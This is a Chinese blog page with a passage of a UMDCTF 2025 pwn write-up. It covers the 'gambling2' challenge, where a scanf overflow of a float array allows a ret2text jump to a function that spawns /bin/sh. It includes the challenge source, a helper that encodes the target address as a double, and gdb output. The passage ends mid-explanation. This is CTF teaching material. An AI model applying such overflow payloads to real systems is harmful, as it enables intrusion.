<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
            if (label) {
                label.textContent = isDark ? "深色" : "浅色";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>UMDCTF 2025 Writeup | 花盆</title><meta name="author" content="LittFlower"/><meta name="description" content="2025 UMDCTF Pwn 题解"/><meta property="og:title" content="UMDCTF 2025 Writeup | 花盆"/><meta property="og:description" content="2025 UMDCTF Pwn 题解"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/UMDCTF2025-Writeup/README.mdx"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="preload" as="style" href="/style.css" type="text/css"/><link rel="preload" as="style" href="/fonts.css" type="text/css"/><link rel="stylesheet" href="/style.css" type="text/css"/><link rel="stylesheet" href="/fonts.css" type="text/css"/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt loading="lazy" decoding="async"/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt loading="lazy" decoding="async"/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="umdctf-2025-writeup" class="scroll-target"><a href="#umdctf-2025-writeup"><code class="hash inline-code">#</code>UMDCTF 2025 Writeup</a></h1>
<p>比赛时间和 ACTF2025 基本上冲突了，所以没时间打，赛时只来得及看了两道签到题就遗憾离场，赛后补了所有的用户态题目，剩了几道 v8 暂时摸了（（</p>
<h2 id="gambling2" class="scroll-target"><a href="#gambling2"><code class="hash inline-code">#</code>gambling2</a></h2>
<p>题目给了源码：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">stdio.h</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">string.h</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">stdlib.h</span><span style="color:#B5695977">></span><br><br><span style="color:#AB5959">float</span><span style="color:#59873A"> rand_float</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">  float</span><span style="color:#393A34"> x </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">float</span><span style="color:#1e754f">)</span><span style="color:#59873A">rand</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> /</span><span style="color:#393A34"> RAND_MAX</span><span style="color:#999999">;</span><br><span style="color:#59873A">  printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">%f\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> x</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  return</span><span style="color:#393A34"> x</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#AB5959">void</span><span style="color:#59873A"> print_money</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#59873A">	system</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#AB5959">void</span><span style="color:#59873A"> gamble</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">	float</span><span style="color:#B07D48"> f</span><span style="color:#1e754f">[</span><span style="color:#2F798A">4</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	float</span><span style="color:#393A34"> target </span><span style="color:#999999">=</span><span style="color:#59873A"> rand_float</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">	printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Enter your lucky numbers: </span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">	scanf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#A65E2B"> %lf</span><span style="color:#A65E2B"> %lf</span><span style="color:#A65E2B"> %lf</span><span style="color:#A65E2B"> %lf</span><span style="color:#A65E2B"> %lf</span><span style="color:#A65E2B"> %lf</span><span style="color:#A65E2B"> %lf</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> f</span><span style="color:#999999">,</span><span style="color:#393A34">f</span><span style="color:#AB5959">+</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#393A34">f</span><span style="color:#AB5959">+</span><span style="color:#2F798A">2</span><span style="color:#999999">,</span><span style="color:#393A34">f</span><span style="color:#AB5959">+</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#393A34">f</span><span style="color:#AB5959">+</span><span style="color:#2F798A">4</span><span style="color:#999999">,</span><span style="color:#393A34">f</span><span style="color:#AB5959">+</span><span style="color:#2F798A">5</span><span style="color:#999999">,</span><span style="color:#393A34">f</span><span style="color:#AB5959">+</span><span style="color:#2F798A">6</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">	if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#B07D48">f</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">0</span><span style="color:#a65e2b">]</span><span style="color:#AB5959"> ==</span><span style="color:#393A34"> target </span><span style="color:#AB5959">||</span><span style="color:#B07D48"> f</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">1</span><span style="color:#a65e2b">]</span><span style="color:#AB5959"> ==</span><span style="color:#393A34"> target </span><span style="color:#AB5959">||</span><span style="color:#B07D48"> f</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">2</span><span style="color:#a65e2b">]</span><span style="color:#AB5959"> ==</span><span style="color:#393A34"> target </span><span style="color:#AB5959">||</span><span style="color:#B07D48"> f</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">3</span><span style="color:#a65e2b">]</span><span style="color:#AB5959"> ==</span><span style="color:#393A34"> target </span><span style="color:#AB5959">||</span><span style="color:#B07D48"> f</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">4</span><span style="color:#a65e2b">]</span><span style="color:#AB5959"> ==</span><span style="color:#393A34"> target </span><span style="color:#AB5959">||</span><span style="color:#B07D48"> f</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">5</span><span style="color:#a65e2b">]</span><span style="color:#AB5959"> ==</span><span style="color:#393A34"> target </span><span style="color:#AB5959">||</span><span style="color:#B07D48"> f</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">6</span><span style="color:#a65e2b">]</span><span style="color:#AB5959"> ==</span><span style="color:#393A34"> target</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">		printf</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">You win!</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#A0ADA0">		// due to economic concerns, we're no longer allowed to give out prizes.</span><br><span style="color:#A0ADA0">		// print_money();</span><br><span style="color:#999999">	</span><span style="color:#1e754f">}</span><span style="color:#1E754F"> else</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">		printf</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Aww dang it!</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">	</span><span style="color:#1e754f">}</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#AB5959">int</span><span style="color:#59873A"> main</span><span style="color:#2993a3">(</span><span style="color:#AB5959">void</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#59873A">    setvbuf</span><span style="color:#1e754f">(</span><span style="color:#393A34">stdout</span><span style="color:#999999">,</span><span style="color:#1E754F"> NULL</span><span style="color:#999999">,</span><span style="color:#393A34"> _IONBF</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    setvbuf</span><span style="color:#1e754f">(</span><span style="color:#393A34">stdin</span><span style="color:#999999">,</span><span style="color:#1E754F"> NULL</span><span style="color:#999999">,</span><span style="color:#393A34"> _IONBF</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">	char</span><span style="color:#B07D48"> buf</span><span style="color:#1e754f">[</span><span style="color:#2F798A">20</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#59873A">	srand</span><span style="color:#1e754f">(</span><span style="color:#2F798A">420</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">	while</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">		gamble</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">		getc</span><span style="color:#a65e2b">(</span><span style="color:#393A34">stdin</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // consume newline</span><br><span style="color:#59873A">		printf</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Try again? </span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">		fgets</span><span style="color:#a65e2b">(</span><span style="color:#393A34">buf</span><span style="color:#999999">,</span><span style="color:#2F798A"> 20</span><span style="color:#999999">,</span><span style="color:#393A34"> stdin</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">		if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#59873A">strcmp</span><span style="color:#a13865">(</span><span style="color:#393A34">buf</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">no.</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#a13865">)</span><span style="color:#AB5959"> ==</span><span style="color:#2F798A"> 0</span><span style="color:#a65e2b">)</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><br><span style="color:#1E754F">			break</span><span style="color:#999999">;</span><br><span style="color:#999999">		</span><span style="color:#a65e2b">}</span><br><span style="color:#999999">	</span><span style="color:#1e754f">}</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">stdio.h</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">string.h</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">stdlib.h</span><span style="color:#C98A7D77">></span><br><br><span style="color:#CB7676">float</span><span style="color:#80A665"> rand_float</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">  float</span><span style="color:#DBD7CAEE"> x </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">float</span><span style="color:#4d9375">)</span><span style="color:#80A665">rand</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> /</span><span style="color:#DBD7CAEE"> RAND_MAX</span><span style="color:#666666">;</span><br><span style="color:#80A665">  printf</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">%f\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  return</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#CB7676">void</span><span style="color:#80A665"> print_money</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#80A665">	system</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/bin/sh</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#CB7676">void</span><span style="color:#80A665"> gamble</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">	float</span><span style="color:#BD976A"> f</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">4</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	float</span><span style="color:#DBD7CAEE"> target </span><span style="color:#666666">=</span><span style="color:#80A665"> rand_float</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">	printf</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Enter your lucky numbers: </span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">	scanf</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C99076"> %lf</span><span style="color:#C99076"> %lf</span><span style="color:#C99076"> %lf</span><span style="color:#C99076"> %lf</span><span style="color:#C99076"> %lf</span><span style="color:#C99076"> %lf</span><span style="color:#C99076"> %lf</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">f</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">f</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">2</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">f</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">f</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">4</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">f</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">5</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">f</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">6</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">	if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#BD976A">f</span><span style="color:#d4976c">[</span><span style="color:#4C9A91">0</span><span style="color:#d4976c">]</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> target </span><span style="color:#CB7676">||</span><span style="color:#BD976A"> f</span><span style="color:#d4976c">[</span><span style="color:#4C9A91">1</span><span style="color:#d4976c">]</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> target </span><span style="color:#CB7676">||</span><span style="color:#BD976A"> f</span><span style="color:#d4976c">[</span><span style="color:#4C9A91">2</span><span style="color:#d4976c">]</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> target </span><span style="color:#CB7676">||</span><span style="color:#BD976A"> f</span><span style="color:#d4976c">[</span><span style="color:#4C9A91">3</span><span style="color:#d4976c">]</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> target </span><span style="color:#CB7676">||</span><span style="color:#BD976A"> f</span><span style="color:#d4976c">[</span><span style="color:#4C9A91">4</span><span style="color:#d4976c">]</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> target </span><span style="color:#CB7676">||</span><span style="color:#BD976A"> f</span><span style="color:#d4976c">[</span><span style="color:#4C9A91">5</span><span style="color:#d4976c">]</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> target </span><span style="color:#CB7676">||</span><span style="color:#BD976A"> f</span><span style="color:#d4976c">[</span><span style="color:#4C9A91">6</span><span style="color:#d4976c">]</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> target</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">		printf</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">You win!</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#758575DD">		// due to economic concerns, we're no longer allowed to give out prizes.</span><br><span style="color:#758575DD">		// print_money();</span><br><span style="color:#666666">	</span><span style="color:#4d9375">}</span><span style="color:#4D9375"> else</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">		printf</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Aww dang it!</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">	</span><span style="color:#4d9375">}</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#CB7676">int</span><span style="color:#80A665"> main</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">void</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#80A665">    setvbuf</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stdout</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> _IONBF</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">    setvbuf</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stdin</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> _IONBF</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">	char</span><span style="color:#BD976A"> buf</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">20</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#80A665">	srand</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">420</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">	while</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">		gamble</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">		getc</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">stdin</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><span style="color:#758575DD"> // consume newline</span><br><span style="color:#80A665">		printf</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Try again? </span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">		fgets</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">buf</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 20</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stdin</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">		if</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#80A665">strcmp</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">buf</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">no.</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#d9739f">)</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 0</span><span style="color:#d4976c">)</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><br><span style="color:#4D9375">			break</span><span style="color:#666666">;</span><br><span style="color:#666666">		</span><span style="color:#d4976c">}</span><br><span style="color:#666666">	</span><span style="color:#4d9375">}</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>简单调试一下发现，<code class="inline-code">gamble</code> 函数里生命的 <code class="inline-code">f</code> 是 <code class="inline-code">float</code> 四字节类型，且只有 4 个，读入时却读入了 <code class="inline-code">double</code> 类型且读入了 7 个，存在栈溢出，ret2text。</p>
<p>问题在怎么比较方便地将一个十六进制数进行 IEEE754 解码（将这个结果输入给 scanf 在内存里就会得到 backdoor）</p>
<p>这里用的方法有两种：</p>
<p><strong>第一种</strong>：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">stdio.h</span><span style="color:#B5695977">></span><br><br><span style="color:#AB5959">union</span><span style="color:#393A34"> test </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">    double</span><span style="color:#393A34"> x</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    long</span><span style="color:#AB5959"> long</span><span style="color:#393A34"> y</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><span style="color:#393A34"> a</span><span style="color:#999999">;</span><br><br><br><span style="color:#AB5959">int</span><span style="color:#59873A"> main</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#B07D48">    a</span><span style="color:#999999">.</span><span style="color:#B07D48">y</span><span style="color:#999999"> =</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">80492C000000000</span><span style="color:#999999">;</span><br><span style="color:#59873A">    printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">%e\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> a</span><span style="color:#999999">.</span><span style="color:#B07D48">x</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">stdio.h</span><span style="color:#C98A7D77">></span><br><br><span style="color:#CB7676">union</span><span style="color:#DBD7CAEE"> test </span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">    double</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    long</span><span style="color:#CB7676"> long</span><span style="color:#DBD7CAEE"> y</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><span style="color:#DBD7CAEE"> a</span><span style="color:#666666">;</span><br><br><br><span style="color:#CB7676">int</span><span style="color:#80A665"> main</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#BD976A">    a</span><span style="color:#666666">.</span><span style="color:#BD976A">y</span><span style="color:#666666"> =</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">80492C000000000</span><span style="color:#666666">;</span><br><span style="color:#80A665">    printf</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">%e\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> a</span><span style="color:#666666">.</span><span style="color:#BD976A">x</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    return</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>在写 poc 的时候，注意 <code class="inline-code">double</code> 是 8 字节类型，所以对应的应该使用 <code class="inline-code">long long</code>，而且由于栈溢出（可以通过调试得出），这里 <code class="inline-code">a.y</code> 应该等于 <code class="inline-code">0x80492C000000000</code> 而非 <code class="inline-code">0x80492C</code>，编译后运行得到输出：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-bash language-bash"><span style="color:#59873A">$</span><span style="color:#B56959"> ./test</span><br><span style="color:#59873A">4.867844e-270</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-bash language-bash"><span style="color:#80A665">$</span><span style="color:#C98A7D"> ./test</span><br><span style="color:#80A665">4.867844e-270</span><br></code></pre></div>
<p><strong>方法二</strong>：</p>
<p>直接在 gdb 中查看存储浮点数部分的栈：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-text">00:0000│-048 0xffdd4730 ◂— 0
... ↓     6 skipped
07:001c│-02c 0xffdd474c —▸ 0x80492c0 (print_money) ◂— sub esp, 0x18  // 这里是溢出点
</code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-text">00:0000│-048 0xffdd4730 ◂— 0
... ↓     6 skipped
07:001c│-02c 0xffdd474c —▸ 0x80492c0 (print_money) ◂— sub esp, 0x18  // 这里是溢出点
</code></pre></div>
<p>然后直接查看对应的浮点数：</p>
